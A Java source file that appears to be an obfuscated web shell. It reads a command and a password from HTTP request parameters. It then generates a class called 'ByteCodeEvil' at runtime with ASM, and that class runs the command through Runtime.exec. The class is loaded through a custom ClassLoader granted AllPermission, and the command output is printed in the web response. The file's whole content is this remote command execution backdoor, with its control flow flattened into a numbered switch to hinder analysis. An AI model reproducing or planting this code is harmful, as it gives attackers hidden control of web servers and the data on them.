public class CLAsm {
    public static void main(String[] args) {
        final String[] globalArr = new String[]{
                "0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52|53|54|55|56|57|58|59|60|61|62|63|64|65|66",
                "cmd",
                "pwd",
                "ByteCodeEvil",
                "java/lang/Object",
                "res",
                "Ljava/lang/String;",
                "<init>",
                "(Ljava/lang/String;)V",
                "java/io/IOException",
                "()V",
                "java/lang/StringBuilder",
                "java/io/BufferedReader",
                "java/io/InputStreamReader",
                "java/lang/Runtime",
                "getRuntime",
                "()Ljava/lang/Runtime;",
                "exec",
                "(Ljava/lang/String;)Ljava/lang/Process;",
                "java/lang/Process",
                "getInputStream",
                "()Ljava/io/InputStream;",
                "(Ljava/io/InputStream;)V",
                "(Ljava/io/Reader;)V",
                "readLine",
                "()Ljava/lang/String;",
                "append",
                "(Ljava/lang/String;)Ljava/lang/StringBuilder;",
                "toString",
                "<pre>",
                "</pre>",
                "ByteCodeEvil"
        };

        String cmd = null;
        String pwd = null;
        jdk.internal.org.objectweb.asm.ClassWriter classWriter = null;
        jdk.internal.org.objectweb.asm.FieldVisitor fieldVisitor = null;
        jdk.internal.org.objectweb.asm.MethodVisitor methodVisitor = null;
        jdk.internal.org.objectweb.asm.Label label0 = null;
        jdk.internal.org.objectweb.asm.Label label1 = null;
        byte[] code = null;
        final java.util.Map<Integer, byte[]> finalCode = new java.util.HashMap<>(1);
        ClassLoader loader = null;
        Class<?> clazz = null;
        java.lang.reflect.Constructor<?> constructor = null;
        String result = null;

        String temp = globalArr[0];
        String[] b = temp.split("\\|");
        int index = 0;
        while (true) {
            int op = Integer.parseInt(b[index++]);
            switch (op) {
                case 0:
                    cmd = request.getParameter(globalArr[1]);
                    break;
                case 1:
                    pwd = request.getParameter(globalArr[2]);
                    break;
                case 3:
                    if (!pwd.equals(PASSWORD)) {
                        return;
                    }
                    break;
                case 4:
                    classWriter = new jdk.internal.org.objectweb.asm.ClassWriter(2);
                    break;
                case 5:
                    classWriter.visit(52, 33, globalArr[3], null, globalArr[4], null);
                    break;
                case 6:
                    fieldVisitor = classWriter.visitField(0, globalArr[5], globalArr[6], null, null);
                    break;
                case 7:
                    fieldVisitor.visitEnd();
                    break;
                case 8:
                    methodVisitor = classWriter.visitMethod(1, globalArr[7], globalArr[8], null, new String[]{globalArr[9]});
                    break;
                case 9:
                    methodVisitor.visitCode();
                    break;
                case 10:
                    methodVisitor.visitVarInsn(25, 0);
                    break;
                case 11:
                    methodVisitor.visitMethodInsn(183, globalArr[4], globalArr[7], globalArr[10], false);
                    break;
                case 12:
                    methodVisitor.visitTypeInsn(187, globalArr[11]);
                    break;
                case 13:
                    methodVisitor.visitInsn(89);
                    break;
                case 14:
                    methodVisitor.visitMethodInsn(183, globalArr[11], globalArr[7], globalArr[10], false);
                    break;
                case 15:
                    methodVisitor.visitVarInsn(58, 2);
                    break;
                case 16:
                    methodVisitor.visitTypeInsn(187, globalArr[12]);
                    break;
                case 17:
                    methodVisitor.visitInsn(89);
                    break;
                case 18:
                    methodVisitor.visitTypeInsn(187, globalArr[13]);
                    break;
                case 19:
                    methodVisitor.visitInsn(89);
                    break;
                case 20:
                    methodVisitor.visitMethodInsn(184, globalArr[14], globalArr[15], globalArr[16], false);
                    break;
                case 21:
                    methodVisitor.visitVarInsn(25, 1);
                    break;
                case 22:
                    methodVisitor.visitMethodInsn(182, globalArr[14], globalArr[17], globalArr[18], false);
                    break;
                case 23:
                    methodVisitor.visitMethodInsn(182, globalArr[19], globalArr[20], globalArr[21], false);
                    break;
                case 24:
                    methodVisitor.visitMethodInsn(183, globalArr[13], globalArr[7], globalArr[22], false);
                    break;
                case 25:
                    methodVisitor.visitMethodInsn(183, globalArr[12], globalArr[7], globalArr[23], false);
                    break;
                case 26:
                    methodVisitor.visitVarInsn(58, 3);
                    break;
                case 27:
                    label0 = new jdk.internal.org.objectweb.asm.Label();
                    break;
                case 28:
                    methodVisitor.visitLabel(label0);
                    break;
                case 29:
                    methodVisitor.visitVarInsn(25, 3);
                    break;
                case 30:
                    methodVisitor.visitMethodInsn(182, globalArr[12], globalArr[24], globalArr[25], false);
                    break;
                case 31:
                    methodVisitor.visitInsn(89);
                    break;
                case 32:
                    methodVisitor.visitVarInsn(58, 4);
                    break;
                case 33:
                    label1 = new jdk.internal.org.objectweb.asm.Label();
                    break;
                case 34:
                    methodVisitor.visitJumpInsn(198, label1);
                    break;
                case 35:
                    methodVisitor.visitVarInsn(25, 2);
                    break;
                case 36:
                    methodVisitor.visitVarInsn(25, 4);
                    break;
                case 37:
                    methodVisitor.visitMethodInsn(182, globalArr[11], globalArr[26], globalArr[27], false);
                    break;
                case 38:
                    methodVisitor.visitLdcInsn("\n");
                    break;
                case 39:
                    methodVisitor.visitMethodInsn(182, globalArr[11], globalArr[26], globalArr[27], false);
                    break;
                case 40:
                    methodVisitor.visitInsn(87);
                    break;
                case 41:
                    methodVisitor.visitJumpInsn(167, label0);
                    break;
                case 42:
                    methodVisitor.visitLabel(label1);
                    break;
                case 43:
                    methodVisitor.visitVarInsn(25, 0);
                    break;
                case 44:
                    methodVisitor.visitVarInsn(25, 2);
                    break;
                case 45:
                    methodVisitor.visitMethodInsn(182, globalArr[11], globalArr[28], globalArr[25], false);
                    break;
                case 46:
                    methodVisitor.visitFieldInsn(181, globalArr[3], globalArr[5], globalArr[6]);
                    break;
                case 47:
                    methodVisitor.visitInsn(177);
                    break;
                case 48:
                    methodVisitor.visitMaxs(6, 5);
                    break;
                case 49:
                    methodVisitor.visitEnd();
                    break;
                case 50:
                    methodVisitor = classWriter.visitMethod(1, globalArr[28], globalArr[25], null, null);
                    break;
                case 51:
                    methodVisitor.visitCode();
                    break;
                case 52:
                    methodVisitor.visitVarInsn(25, 0);
                    break;
                case 53:
                    methodVisitor.visitFieldInsn(180, globalArr[3], globalArr[5], globalArr[6]);
                    break;
                case 54:
                    methodVisitor.visitInsn(176);
                    break;
                case 55:
                    methodVisitor.visitMaxs(1, 1);
                    break;
                case 56:
                    methodVisitor.visitEnd();
                    break;
                case 57:
                    classWriter.visitEnd();
                    break;
                case 58:
                    code = classWriter.toByteArray();
                    break;
                case 59:
                    finalCode.put(666, code);
                    break;
                case 60:
                    loader = new ClassLoader() {
                        @Override
                        public Class<?> loadClass(String QwEr) throws ClassNotFoundException {
                            if (QwEr.contains(globalArr[31])) {
                                return findClass(QwEr);
                            }
                            return super.loadClass(QwEr);
                        }

                        @Override
                        protected Class<?> findClass(String PoIu) throws ClassNotFoundException {
                            try {
                                byte[] innerBytes = finalCode.get(666);
                                java.security.PermissionCollection pc = new java.security.Permissions();
                                pc.add(new java.security.AllPermission());
                                java.security.ProtectionDomain protectionDomain = new java.security.ProtectionDomain(
                                        new java.security.CodeSource(null, (java.security.cert.Certificate[]) null),
                                        pc, this, null);
                                return this.defineClass(PoIu, innerBytes, 0, innerBytes.length, protectionDomain);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            return super.findClass(PoIu);
                        }
                    };
                    break;
                case 61:
                    clazz = loader.loadClass(globalArr[3]);
                    break;
                case 62:
                    constructor = clazz.getConstructor(String.class);
                    break;
                case 63:
                    result = constructor.newInstance(cmd).toString();
                    break;
                case 64:
                    response.getWriter().print(globalArr[29]);
                    break;
                case 65:
                    response.getWriter().print(result.toString());
                    break;
                case 66:
                    response.getWriter().print(globalArr[30]);
                    break;
            }
        }
    }
}